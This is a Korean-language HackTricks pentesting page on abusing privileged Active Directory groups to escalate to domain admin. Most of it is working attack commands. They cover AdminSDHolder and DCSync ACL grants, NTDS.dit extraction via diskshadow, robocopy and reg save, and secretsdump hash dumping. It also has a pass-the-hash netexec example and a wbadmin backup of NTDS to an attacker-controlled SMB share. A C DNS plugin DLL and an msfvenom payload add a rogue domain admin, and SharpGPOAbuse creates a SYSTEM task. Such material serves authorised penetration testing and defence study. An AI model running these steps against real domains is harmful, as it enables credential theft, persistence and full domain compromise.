# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 관리 권한이 있는 잘 알려진 그룹

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 그룹은 도메인에서 administrators가 아닌 계정과 그룹을 생성할 수 있는 권한을 가집니다. 또한 Domain Controller (DC)에 로컬 로그인을 허용합니다.

이 그룹의 멤버를 식별하려면 다음 명령을 실행합니다:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새 사용자 추가가 허용되며, DC에 대한 로컬 로그인도 허용됩니다.<sup>[[1]](#references)</sup>

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 Access Control List(ACL)는 Active Directory 내의 모든 "protected groups"에 대한 권한을 설정하므로 매우 중요합니다. 여기에는 높은 권한을 가진 그룹도 포함됩니다. 이 메커니즘은 무단 수정을 방지하여 이러한 그룹의 보안을 유지합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 일반 사용자에게 모든 권한을 부여하는 방식으로 이를 악용할 수 있습니다. 이렇게 하면 해당 사용자는 모든 protected groups를 완전히 제어할 수 있습니다. 이 사용자의 권한이 변경되거나 제거되더라도 시스템 설계에 따라 1시간 이내에 자동으로 다시 적용됩니다.<sup>[[14]](#references)</sup>

최근 Windows Server 문서에서도 몇몇 기본 제공 operator groups를 **protected** 객체(`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` 등)로 취급합니다. **SDProp** 프로세스는 기본적으로 60분마다 **PDC Emulator**에서 실행되며, `adminCount=1`을 설정하고 protected objects에서 inheritance를 비활성화합니다. 이는 persistence에 유용하며, protected group에서 제거되었지만 여전히 inheritance가 비활성화된 ACL을 유지하는 오래된 privileged users를 탐지하는 데도 유용합니다.<sup>[[12]](#references)</sup>

멤버를 검토하고 권한을 수정하는 명령은 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
복원 프로세스를 신속하게 진행할 수 있는 스크립트가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 참고하세요.<sup>[[14]](#references)</sup>

## AD 휴지통

이 그룹의 구성원은 삭제된 Active Directory 객체를 읽을 수 있으며, 이를 통해 민감한 정보가 노출될 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
이는 **이전 권한 경로를 복구**하는 데 유용합니다. 삭제된 객체에는 여전히 `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, 이전 SPN 또는 나중에 다른 운영자가 복원할 수 있는 삭제된 privileged group의 DN이 노출될 수 있습니다.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller 접근

DC의 파일에 대한 접근은 사용자가 `Server Operators` 그룹의 구성원인 경우를 제외하고 제한되며, 이 경우 접근 수준이 변경됩니다.

### Privilege Escalation

Sysinternals의 `PsService` 또는 `sc`를 사용하면 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대한 모든 권한을 가지므로 임의의 명령을 실행하고 권한을 상승시킬 수 있습니다:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 전체 액세스 권한을 가지며, 이를 통해 높은 권한을 얻기 위해 서비스를 조작할 수 있음을 보여줍니다.

## Backup Operators

`Backup Operators` 그룹의 구성원은 `SeBackup` 및 `SeRestore` 권한으로 인해 `DC01` 파일 시스템에 액세스할 수 있습니다. 이러한 권한을 사용하면 명시적인 권한이 없어도 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용하여 폴더 탐색, 목록 확인 및 파일 복사가 가능합니다. 이 프로세스에는 특정 scripts를 사용해야 합니다.<sup>[[1]](#references)</sup>

그룹 구성원을 나열하려면 다음을 실행합니다:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 로컬 공격

이러한 권한을 로컬에서 활용하려면 다음 단계를 수행합니다:

1. 필요한 라이브러리를 Import합니다:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉터리에서 파일에 액세스하고 복사합니다. 예를 들어:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller의 파일 시스템에 직접 접근하면 도메인 사용자 및 컴퓨터의 모든 NTLM 해시가 포함된 `NTDS.dit` 데이터베이스를 탈취할 수 있습니다.

#### diskshadow.exe 사용

1. `C` 드라이브의 shadow copy를 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. shadow copy에서 `NTDS.dit` 복사:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
또는 파일 복사에 `robocopy`를 사용합니다:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 추출을 위해 `SYSTEM` 및 `SAM` 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 hash를 가져옵니다:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 추출 후: Pass-the-Hash로 DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Using wbadmin.exe

1. 공격자 시스템에서 SMB server용 NTFS filesystem을 설정하고 대상 시스템에 SMB credentials를 cache합니다.
2. system backup 및 `NTDS.dit` extraction에 `wbadmin.exe`를 사용합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

실제 demonstration은 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)을 참조하세요.

## DnsAdmins

**DnsAdmins** group의 members는 privileges를 악용하여 DNS server에서 SYSTEM privileges로 arbitrary DLL을 load할 수 있습니다. DNS server는 자주 Domain Controllers에서 host됩니다. 이 capability는 상당한 exploitation potential을 제공합니다.

DnsAdmins group의 members를 나열하려면 다음을 사용합니다:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의의 DLL 실행 (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점을 이용하면 DNS service(일반적으로 DC 내부)에서 SYSTEM 권한으로 임의의 code를 실행할 수 있습니다. 이 문제는 2021년에 수정되었습니다.

Members는 다음과 같은 commands를 사용하여 DNS server가 임의의 DLL을 load하도록 만들 수 있습니다(로컬 또는 remote share에서).
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL이 로드되도록 DNS 서비스를 다시 시작해야 합니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
이 attack vector에 대한 자세한 내용은 ired.team을 참조하세요.

#### Mimilib.dll

mimilib.dll을 사용해 command execution을 수행하고, 특정 명령이나 reverse shell을 실행하도록 수정하는 것도 가능합니다. 자세한 내용은 [이 게시물](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)을 확인하세요.<sup>[[15]](#references)</sup>

### MitM을 위한 WPAD Record

DnsAdmins는 global query block list를 비활성화한 후 WPAD record를 생성하여 DNS records를 조작하고 Man-in-the-Middle (MitM) attacks를 수행할 수 있습니다. Responder 또는 Inveigh와 같은 도구를 사용하여 spoofing을 수행하고 네트워크 트래픽을 캡처할 수 있습니다.

### Event Log Readers
멤버는 event logs에 액세스하여 plaintext passwords 또는 command execution details와 같은 민감한 정보를 찾을 수 있습니다:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

이 그룹은 도메인 개체의 DACL을 수정하여 잠재적으로 DCSync 권한을 부여할 수 있습니다. 이 그룹을 악용한 privilege escalation 기법은 Exchange-AD-Privesc GitHub repo에 자세히 설명되어 있습니다.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
이 그룹의 구성원으로 활동할 수 있다면, 가장 일반적인 악용 방법은 공격자가 제어하는 보안 주체에 [DCSync](dcsync.md)에 필요한 복제 권한을 부여하는 것입니다:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange**는 mailbox access, 강제된 Exchange authentication, LDAP relay를 연쇄적으로 사용하여 동일한 primitive를 확보했습니다. 해당 relay 경로가 완화된 경우에도 `Exchange Windows Permissions`에 직접 포함되어 있거나 Exchange 서버를 제어할 수 있다면 domain replication rights로 이어지는 고가치 경로가 됩니다.

## Hyper-V Administrators

Hyper-V Administrators는 Hyper-V에 대한 모든 권한을 가지므로, 이를 악용하여 virtualized Domain Controllers를 제어할 수 있습니다. 여기에는 live DC를 cloning하고 `NTDS.dit` 파일에서 NTLM hashes를 추출하는 작업이 포함됩니다.

### Exploitation Example

실제 abuse는 일반적으로 과거의 host-level LPE tricks보다는 **DC disks/checkpoints에 대한 offline access**를 이용합니다. Hyper-V host에 접근할 수 있는 operator는 virtualized Domain Controller에 checkpoint를 생성하거나 이를 export하고, VHDX를 mount한 다음 guest 내부의 LSASS에 접근하지 않고 `NTDS.dit`, `SYSTEM` 및 기타 secrets를 추출할 수 있습니다:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
그곳에서 `Backup Operators` workflow를 재사용하여 `Windows\NTDS\ntds.dit`와 레지스트리 hive를 오프라인으로 복사합니다. 관련 backup-file workflow:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners

이 그룹을 사용하면 멤버가 도메인에서 Group Policies를 생성할 수 있습니다. 하지만 멤버는 사용자 또는 그룹에 group policies를 적용하거나 기존 GPO를 편집할 수 없습니다.

중요한 점은 **생성자가 새 GPO의 소유자가 되며**, 일반적으로 이후 해당 GPO를 편집할 수 있는 충분한 권한을 얻게 된다는 것입니다. 따라서 다음 중 하나가 가능한 경우 이 그룹이 유용합니다.

- malicious GPO를 생성하고 관리자가 이를 대상 OU/domain에 link하도록 설득
- 이미 유용한 위치에 link된, 자신이 생성한 GPO를 편집
- GPO를 link할 수 있는 다른 delegated right를 abuse하고, 이 그룹으로 편집 권한 확보

실제 abuse는 일반적으로 SYSVOL-backed policy files를 통해 **Immediate Task**, **startup script**, **local admin membership** 또는 **user rights assignment** 변경을 추가하는 방식으로 수행됩니다.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL`을 통해 GPO를 수동으로 편집하는 경우, 변경만으로는 충분하지 않다는 점을 기억해야 합니다. `versionNumber`, `GPT.ini`, 그리고 경우에 따라 `gPCMachineExtensionNames`도 업데이트해야 하며, 그렇지 않으면 클라이언트가 정책 새로 고침을 무시합니다.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**가 배포된 환경에서는 **Organization Management**라는 특수 그룹이 상당한 권한을 보유합니다. 이 그룹은 **모든 도메인 사용자의 mailbox에 액세스**할 수 있는 권한을 가지며, **'Microsoft Exchange Security Groups'** Organizational Unit (OU)에 대한 **full control**을 유지합니다. 이 제어 권한에는 권한 상승에 악용될 수 있는 **`Exchange Windows Permissions`** 그룹도 포함됩니다.

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** 그룹의 구성원에게는 여러 권한이 부여되며, 여기에는 **`SeLoadDriverPrivilege`**도 포함됩니다. 이 권한을 사용하면 **Domain Controller에 로컬로 로그온**하고, 시스템을 종료하며, 프린터를 관리할 수 있습니다. 이러한 권한을 악용하려면, 특히 권한이 상승되지 않은 context에서 **`SeLoadDriverPrivilege`**가 표시되지 않는 경우 User Account Control (UAC) 우회가 필요합니다.<sup>[[1]](#references)</sup>

이 그룹의 구성원을 나열하려면 다음 PowerShell command를 사용합니다:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
도메인 컨트롤러에서 이 그룹이 위험한 이유는 기본 도메인 컨트롤러 정책이 **`SeLoadDriverPrivilege`**를 `Print Operators`에 부여하기 때문입니다. 이 그룹의 구성원에 대한 권한 상승 토큰을 확보하면 해당 권한을 활성화하고 서명되었지만 취약한 드라이버를 로드하여 커널/SYSTEM으로 이동할 수 있습니다.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> 토큰 처리에 대한 자세한 내용은 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)을 참조하세요.

#### Remote Desktop Users

이 그룹의 구성원은 Remote Desktop Protocol (RDP)을 통해 PC에 액세스할 수 있습니다. 이러한 구성원을 열거하려면 PowerShell 명령을 사용할 수 있습니다:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP 악용에 대한 추가적인 인사이트는 전용 pentesting 리소스에서 확인할 수 있습니다.

#### 원격 관리 사용자

구성원은 **Windows Remote Management (WinRM)**을 통해 PC에 액세스할 수 있습니다. 이러한 구성원의 열거는 다음을 통해 수행됩니다:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
For **WinRM** 관련 exploitation 기법은 특정 documentation을 참고해야 합니다.

#### Server Operators

이 그룹은 backup 및 restore privileges, system time 변경, system shutdown을 포함하여 Domain Controllers에서 다양한 configuration을 수행할 수 있는 permissions을 가집니다.<sup>[[1]](#references)</sup> 멤버를 enumerate하려면 다음 command를 사용합니다:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
도메인 컨트롤러에서 `Server Operators`는 일반적으로 **서비스를 재구성하거나 시작/중지할 수 있는 충분한 권한**을 상속하며, 기본 DC 정책을 통해 `SeBackupPrivilege`/`SeRestorePrivilege`도 부여받습니다. 실제로 이는 **서비스 제어 악용**과 **NTDS 추출**을 연결하는 가교 역할을 합니다:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
서비스 ACL이 이 그룹에 변경/시작 권한을 부여한다면, 서비스를 임의의 명령을 가리키도록 설정하고 `LocalSystem`으로 시작한 다음 원래 `binPath`를 복원합니다. 서비스 제어가 제한되어 있다면, 위의 `Backup Operators` techniques를 사용해 `NTDS.dit`를 복사하는 방법으로 전환합니다.

## References

- [1] [ired.team – Privileged Accounts 및 Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation을 위한 SeLoadDriverPrivilege 악용](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO Permissions 악용](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, Part 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO 및 OU를 위한 Red Teamer 가이드](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 함수](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 부록 C: Active Directory의 Protected Accounts 및 Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Domain Admin Persistence 획득을 위한 AdminSDHolder 악용 및 Backdoor 방법](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory에서 Escalation을 위한 DnsAdmins Privilege 악용](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll edge abuse 정보](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 함수 (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
